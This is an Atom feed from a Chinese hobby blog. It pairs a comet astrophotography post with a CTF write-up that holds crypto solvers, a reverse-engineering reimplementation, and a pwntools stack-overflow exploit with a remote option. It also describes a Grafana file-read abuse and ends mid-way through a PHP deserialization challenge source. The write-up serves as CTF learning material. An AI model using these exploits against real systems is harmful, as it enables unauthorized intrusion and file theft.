<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="https://feverhu.github.io/atom.xml" rel="self"/>
  
  <link href="https://feverhu.github.io/"/>
  <updated>2023-01-29T15:31:12.096Z</updated>
  <id>https://feverhu.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2023/01/27/ C/2022 E3</title>
    <link href="https://feverhu.github.io/2023/01/29/2023-01-27-C-2022-E3/"/>
    <id>https://feverhu.github.io/2023/01/29/2023-01-27-C-2022-E3/</id>
    <published>2023-01-29T15:10:29.000Z</published>
    <updated>2023-01-29T15:31:12.096Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="c2022-e3">C/2022 E3</span></h1><p>​ 2023年天文学第一次“盛宴”就是c/2022 E3彗星，2月初距离地球最近。本着这么好的天气不起拍拍对不起自己的信达老黑，约上好友去延庆天文农庄奋战一宿。设备：信达老黑，Eq6r赤道仪。第二次拍深空，第一次拍彗星，大佬们勿喷。不多说了，上图：</p><figure><img src="4-2.jpg" alt="4-2"><figcaption>4-2</figcaption></figure><p>参数：对不起 删了元数据。依稀记得是 57张；25s；ISO1600</p><h3><span id="还有一张是m42">还有一张是M42：</span></h3><figure><img src="M42.jpg" alt="M42"><figcaption>M42</figcaption></figure><p>参数：约150张；13s；ISO1600</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;c2022-e3&quot;&gt;C/2022 E3&lt;/span&gt;&lt;/h1&gt;
&lt;p&gt;​ 2023年天文学第一次“盛宴”就是c/2022 E3彗星，2月初距离地球最近。本着这么好的天气不起拍拍对不起自己的信达老黑，约上好友去延庆天文农庄奋战一宿。设备：信达老黑，Eq</summary>
      
    
    
    
    
    <category term="DeepSpace" scheme="https://feverhu.github.io/tags/DeepSpace/"/>
    
  </entry>
  
  <entry>
    <title>天权信安&amp;catf1ag 2022 wp</title>
    <link href="https://feverhu.github.io/2022/12/17/catf1ag-2022-wp/"/>
    <id>https://feverhu.github.io/2022/12/17/catf1ag-2022-wp/</id>
    <published>2022-12-17T12:08:14.000Z</published>
    <updated>2022-12-17T12:27:37.545Z</updated>
    
    <content type="html"><![CDATA[<h2><span id="天权信安ampcatf1ag">天权信安&amp;catf1ag</span></h2><h3><span id="一-解题情况">一、解题情况</span></h3><p>排名：17</p><h3><span id="二-解题过程">二、解题过程</span></h3><h4><span id="crypto">Crypto</span></h4><ul><li><p>题目一： 疑惑</p><p>keys1和keys2异或， exp.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">keys1 = <span class="string">b&quot;welcome_to_nine-ak_match_is_so_easy_!@!&quot;</span></span><br><span class="line">keys2 = <span class="string">&quot;20 4 24 5 94 12 2 36 26 6 49 11 68 15 14 114 12 10 43 14 9 43 10 27 31 31 22 45 10 48 58 4 18 10 38 31 14 97 92&quot;</span></span><br><span class="line"></span><br><span class="line">keys2 = keys2.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">keys2 = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> keys2]</span><br><span class="line">keys2 = <span class="built_in">bytes</span>(keys2)</span><br><span class="line"></span><br><span class="line">flag = [keys1[i] ^ keys2[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(keys1))]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure><p>flag值：catf1ag{nine-ak_match_is@very_easy_@/!}</p></li><li><p>题目二：easyrsa</p><p>已知d,可以直接求了。exp.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">d = <span class="number">12344766091434434733173074189627377553017680360356962089159282442350343171988536143126785315325155784049041041740294461592715296364871912847202681353107182427067350160760722505537695351060872358780516757652343767211907987297081728669843916949983336698385141593880433674937737932158161117039734886760063825649623992179585362400642056715249145349214196969590250787495038347519927017407204272334005860911299915001920451629055970214564924913446260348649062607855669069184216149660211811217616624622378241195643396616228441026080441013816066477785035557421235574948446455413760957154157952685181318232685147981777529010093</span></span><br><span class="line">c = <span class="number">11665709552346194520404644475693304343544277312139717618599619856028953672850971126750357095315011211770308088484683204061365343120233905810281045824420833988717463919084545209896116273241788366262798828075566212041893949256528106615605492953529332060374278942243879658004499423676775019309335825331748319484916607746676069594715000075912334306124627379144493327297854542488373589404460931325101587726363963663368593838684601095345900109519178235587636259017532403848656471367893974805399463278536349688131608183835495334912159111202418065161491440462011639125641718883550113983387585871212805400726591849356527011578</span></span><br><span class="line">n = <span class="number">13717871972706962868710917190864395318380380788726354755874864666298971471295805029284299459288616488109296891203921497014120460143184810218680538647923519587681857800257311678203773339140281665350877914208278709865995451845445601706352659259559793431372688075659019308448963678380545045143583181131530985665822655263963917413080872997526445384954610888776917323156325542921415838122754036103689148810677276471252057077595104724365967333418002158480223657363936976281758713027828747277980907153645847605403914070601944617432177385048803228970693240587900504431163155958465431312258451026447435473865563581029300541109</span></span><br><span class="line"></span><br><span class="line">flag = long_to_bytes(<span class="built_in">pow</span>(c,d,n))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>flag值：flag{3895dfda-67b1-11ed-b784-b07b2568d266}</p></li><li><p>题目三： passwd</p><p>根据题目已知一段年月日时分加密后的sha256。我们用年月日时分爆破就行。exp.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&#x27;69d00d9bc39e01687abf84e98e27c889cf1442b53edba27d3235acbeb7b0ae95&#x27;</span></span><br><span class="line"></span><br><span class="line">year = [<span class="string">&#x27;2022&#x27;</span>, <span class="string">&#x27;2023&#x27;</span>]</span><br><span class="line">month = [(<span class="string">&#x27;0&#x27;</span> + <span class="built_in">str</span>(i))[-<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">13</span>)]</span><br><span class="line">day = [(<span class="string">&#x27;0&#x27;</span> + <span class="built_in">str</span>(i))[-<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">32</span>)]</span><br><span class="line"></span><br><span class="line">minute = [(<span class="string">&#x27;0&#x27;</span> + <span class="built_in">str</span>(i))[-<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">61</span>)]</span><br><span class="line">hours = [(<span class="string">&#x27;0&#x27;</span> + <span class="built_in">str</span>(i))[-<span class="number">2</span>:] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">25</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> itertools.product(year, month, day, hours, minute):</span><br><span class="line">time = i[<span class="number">0</span>] + i[<span class="number">1</span>] + i[<span class="number">2</span>] + i[<span class="number">3</span>] + i[<span class="number">4</span>]</span><br><span class="line">data_sha = hashlib.sha256(time.encode()).hexdigest()</span><br><span class="line"><span class="keyword">if</span> data_sha == cipher:</span><br><span class="line"><span class="built_in">print</span>(time)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>flag值：catf1ag{202211121750}</p></li></ul><h4><span id="reverse">Reverse</span></h4><ul><li><p>题目四：checkin</p><p>先脱壳，先用upxfix修改head，然后再用upx就可以脱了。打开以后找到string。</p></li></ul><figure><img src="1670586754937.png" alt="1670586754937"><figcaption>1670586754937</figcaption></figure><p>找到关键函数位置：</p><figure><img src="1670586788885.png" alt="1670586788885"><figcaption>1670586788885</figcaption></figure><p>进去先去除花指令，得到关键函数：<img src="1670587009221.png" alt="1670587009221"></p><figure><img src="1670586995242.png" alt="1670586995242"><figcaption>1670586995242</figcaption></figure><p>这里v15只在最后用到了，v15=v12，但是v12后面还要加上v13的&quot;#&lt;#&quot;字符。于是可以直接复现：</p><p>exp.c:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;   <span class="type">char</span> v12[<span class="number">42</span>];</span><br><span class="line">    <span class="type">char</span> v15[<span class="number">1009</span>];</span><br><span class="line">    <span class="type">char</span> v16[<span class="number">2432</span>];</span><br><span class="line">    <span class="type">int</span> v10;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(v16, <span class="string">&quot;flechao10&quot;</span>);</span><br><span class="line"></span><br><span class="line">    v12[<span class="number">0</span>] = <span class="number">-125</span>;</span><br><span class="line">  v12[<span class="number">1</span>] = <span class="number">27</span>;</span><br><span class="line">  v12[<span class="number">2</span>] = <span class="number">-14</span>;</span><br><span class="line">  v12[<span class="number">3</span>] = <span class="number">75</span>;</span><br><span class="line">  v12[<span class="number">4</span>] = <span class="number">-81</span>;</span><br><span class="line">  v12[<span class="number">5</span>] = <span class="number">1</span>;</span><br><span class="line">  v12[<span class="number">6</span>] = <span class="number">5</span>;</span><br><span class="line">  v12[<span class="number">7</span>] = <span class="number">35</span>;</span><br><span class="line">  v12[<span class="number">8</span>] = <span class="number">57</span>;</span><br><span class="line">  v12[<span class="number">9</span>] = <span class="number">93</span>;</span><br><span class="line">  v12[<span class="number">10</span>] = <span class="number">-94</span>;</span><br><span class="line">  v12[<span class="number">11</span>] = <span class="number">-101</span>;</span><br><span class="line">  v12[<span class="number">12</span>] = <span class="number">-110</span>;</span><br><span class="line">  v12[<span class="number">13</span>] = <span class="number">-15</span>;</span><br><span class="line">  v12[<span class="number">14</span>] = <span class="number">-99</span>;</span><br><span class="line">  v12[<span class="number">15</span>] = <span class="number">-35</span>;</span><br><span class="line">  v12[<span class="number">16</span>] = <span class="number">-35</span>;</span><br><span class="line">  v12[<span class="number">17</span>] = <span class="number">-103</span>;</span><br><span class="line">  v12[<span class="number">18</span>] = <span class="number">-68</span>;</span><br><span class="line">  v12[<span class="number">19</span>] = <span class="number">119</span>;</span><br><span class="line">  v12[<span class="number">20</span>] = <span class="number">-53</span>;</span><br><span class="line">  v12[<span class="number">21</span>] = <span class="number">25</span>;</span><br><span class="line">  v12[<span class="number">22</span>] = <span class="number">114</span>;</span><br><span class="line">  v12[<span class="number">23</span>] = <span class="number">-27</span>;</span><br><span class="line">  v12[<span class="number">24</span>] = <span class="number">100</span>;</span><br><span class="line">  v12[<span class="number">25</span>] = <span class="number">47</span>;</span><br><span class="line">  v12[<span class="number">26</span>] = <span class="number">-42</span>;</span><br><span class="line">  v12[<span class="number">27</span>] = <span class="number">62</span>;</span><br><span class="line">  v12[<span class="number">28</span>] = <span class="number">15</span>;</span><br><span class="line">  v12[<span class="number">29</span>] = <span class="number">18</span>;</span><br><span class="line">  v12[<span class="number">30</span>] = <span class="number">5</span>;</span><br><span class="line">  v12[<span class="number">31</span>] = <span class="number">108</span>;</span><br><span class="line">  v12[<span class="number">32</span>] = <span class="number">-112</span>;</span><br><span class="line">  v12[<span class="number">33</span>] = <span class="number">48</span>;</span><br><span class="line">  v12[<span class="number">34</span>] = <span class="number">-73</span>;</span><br><span class="line">  v12[<span class="number">35</span>] = <span class="number">2</span>;</span><br><span class="line">  v12[<span class="number">36</span>] = <span class="number">-58</span>;</span><br><span class="line">  v12[<span class="number">37</span>] = <span class="number">-48</span>;</span><br><span class="line">  v12[<span class="number">38</span>] = <span class="number">-24</span>;</span><br><span class="line">  v12[<span class="number">39</span>] = <span class="number">35</span>;</span><br><span class="line">  v12[<span class="number">40</span>] = <span class="number">60</span>;</span><br><span class="line">  v12[<span class="number">41</span>] = <span class="number">35</span>;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    *(<span class="type">uint32_t</span> *)&amp;v16[<span class="number">4</span> * j + <span class="number">1228</span>] = v16[j % <span class="number">9</span>];</span><br><span class="line">    *(<span class="type">uint32_t</span> *)&amp;v16[<span class="number">4</span> * j + <span class="number">20</span>] = j;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="type">int</span> v8;</span><br><span class="line">    <span class="type">int</span> k;</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt; <span class="number">256</span>; ++k )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = (*(<span class="type">uint32_t</span> *)&amp;v16[<span class="number">4</span> * k + <span class="number">1228</span>] + *(<span class="type">uint32_t</span> *)&amp;v16[<span class="number">4</span> * k + <span class="number">20</span>] + v10) % <span class="number">256</span>;</span><br><span class="line">    v8 = *(<span class="type">uint32_t</span> *)&amp;v16[<span class="number">4</span> * k + <span class="number">20</span>];</span><br><span class="line">    *(<span class="type">uint32_t</span> *)&amp;v16[<span class="number">4</span> * k + <span class="number">20</span>] = *(<span class="type">uint32_t</span> *)&amp;v16[<span class="number">4</span> * v10 + <span class="number">20</span>];</span><br><span class="line">    *(<span class="type">uint32_t</span> *)&amp;v16[<span class="number">4</span> * v10 + <span class="number">20</span>] = v8 ^ <span class="number">0x37</span>;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="type">int</span> v5;</span><br><span class="line">    v5 =<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> v11;</span><br><span class="line">    v11 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line">    <span class="type">int</span> v9;</span><br><span class="line">    <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">42</span>; ++m)</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = (v5 + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">    v11 = (*(<span class="type">uint32_t</span> *)&amp;v16[<span class="number">4</span> * v5 + <span class="number">20</span>] + v11) % <span class="number">256</span>;</span><br><span class="line">    v9 = *(<span class="type">uint32_t</span> *)&amp;v16[<span class="number">4</span> * v5 + <span class="number">20</span>];</span><br><span class="line">    *(<span class="type">uint32_t</span> *)&amp;v16[<span class="number">4</span> * v5 + <span class="number">20</span>] = *(<span class="type">uint32_t</span> *)&amp;v16[<span class="number">4</span> * v11 + <span class="number">20</span>];</span><br><span class="line">    *(<span class="type">uint32_t</span> *)&amp;v16[<span class="number">4</span> * v11 + <span class="number">20</span>] = v9;</span><br><span class="line">    v12[m] ^= v16[<span class="number">4</span> * ((*(<span class="type">uint32_t</span> *)&amp;v16[<span class="number">4</span> * v11 + <span class="number">20</span>] + *(<span class="type">uint32_t</span> *)&amp;v16[<span class="number">4</span> * v5 + <span class="number">20</span>]) % <span class="number">256</span>) + <span class="number">20</span>];</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v12);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>flag值：flag{c8d4d879-7a03-405f-8b12-9085a944adad}</p><h4><span id="pwn">pwn</span></h4><ul><li><p>题目五：checkin</p><p>绕过if的方法，输入负号前面加个空格，输入' -123456'：</p><figure><img src="1670587518428.png" alt="1670587518428"><figcaption>1670587518428</figcaption></figure><p>给的flag读取在in1t():</p><figure><img src="1670587600028.png" alt="1670587600028"><figcaption>1670587600028</figcaption></figure></li></ul><p>exp.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#import os</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">code = ELF(<span class="string">&#x27;./checkin&#x27;</span>, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">r</span>):</span><br><span class="line">    <span class="built_in">print</span>(r.recvuntil(<span class="string">b&#x27;name: \n&#x27;</span>))</span><br><span class="line">    r.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.recvline())</span><br><span class="line">    r.send(<span class="string">b&#x27; -123456&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x50</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x4008C3</span>)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">2</span>:</span><br><span class="line">        r = remote(sys.argv[<span class="number">1</span>], <span class="built_in">int</span>(sys.argv[<span class="number">2</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment">#r = remote(&#x27;127.0.0.1&#x27;, 4444)</span></span><br><span class="line">        r = code.process()</span><br><span class="line">    exploit(r)</span><br></pre></td></tr></table></figure><p>​ 结果：</p><figure><img src="1670587677208.png" alt="1670587677208"><figcaption>1670587677208</figcaption></figure><h4><span id="misc">misc</span></h4><ul><li><p>题目六：十位马</p><p>把data变成十六进制，再逆序打印出来。代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> ropen:</span><br><span class="line">data = ropen.read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">data = <span class="built_in">bytes</span>.fromhex(data)</span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line">data = data[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data_r&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> writen:</span><br><span class="line">writen.write(data)</span><br></pre></td></tr></table></figure><figure><img src="1670587960750.png" alt="1670587960750"><figcaption>1670587960750</figcaption></figure><p>不全红线部分zip的头。就可以解压了,得到很多png。<img src="1670588020946.png" alt="1670588020946"></p><p>然后kali用montage得到拼接好的图片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">montage *.png -tile 10x10 -geometry +0+0 montage.png</span><br></pre></td></tr></table></figure><figure><img src="1670588156922.png" alt="1670588156922"><figcaption>1670588156922</figcaption></figure><p>是一个二维码图片，将二维码定位符拼接上去。</p><figure><img src="1670588206214.png" alt="1670588206214"><figcaption>1670588206214</figcaption></figure><p>扫码得到： flag{cbef4c93-5e9c-11ed-8205-666c80085daf}</p></li><li><p>题目七：简单隐写</p><ol type="1"><li><p>将得到的图片分解，得到一张图和一个rar文件压缩包</p></li><li><p>对图片jphide隐写，得到压缩包密码</p><figure><img src="1670588398779.png" alt="1670588398779"><figcaption>1670588398779</figcaption></figure></li><li><p>解压得到字符串：</p><figure><img src="1670588407043.png" alt="1670588407043"><figcaption>1670588407043</figcaption></figure></li><li><p>对字符串进行rot操作，得到flag</p><figure><img src="1670588491251.png" alt="1670588491251"><figcaption>1670588491251</figcaption></figure></li></ol></li></ul><h4><span id="web">web</span></h4><p>因为没看到公告，所以web是凭借记忆的写的。</p><ul><li><p>题目八：history</p><p>1.根据grafana漏洞尝试读取文件，得到grafana用户目录</p><figure><img src="图片1.png" alt="图片1"><figcaption>图片1</figcaption></figure><p>2.根据题目名称《history》和提示“hacker入侵服务器之后没有做好痕迹清理，你能找到hacker的痕迹吗”，查看history文件</p><figure><img src="图片2.png" alt="图片2"><figcaption>图片2</figcaption></figure><p>3.从历史命令记录中得知flag写在了f1ag文件里，读取，得到flag</p><figure><img src="图片3.png" alt="图片3"><figcaption>图片3</figcaption></figure></li><li><p>题目九：POP</p><p>1.根据源码写payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">catf1ag1</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hzy</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arr</span>; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;arr <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hzy-&gt;<span class="variable">$v</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hzy是社么鬼???&quot;</span>;</span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">catf1ag2</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$txt</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="comment">// public function set_file($f)&#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;file=$f;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// public function set_txt($t)&#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;txt=$t;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="string">&#x27;pputut&#x27;</span>)&#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">pputut</span>(); </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&lt;p&gt;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$key</span>).<span class="string">&#x27;&lt;/p&gt;&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">pputut</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(    <span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;file,<span class="string">&#x27;../&#x27;</span>) !== <span class="literal">false</span> || </span><br><span class="line">            <span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;file,<span class="string">&#x27;\\&#x27;</span>) !== <span class="literal">false</span>      </span><br><span class="line">        ) <span class="keyword">die</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php die(\&#x27;stupid\&#x27;); ?&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;NICE!!!,来自wsy赠送的小红花&lt;/br&gt;&quot;</span>;</span><br><span class="line">        <span 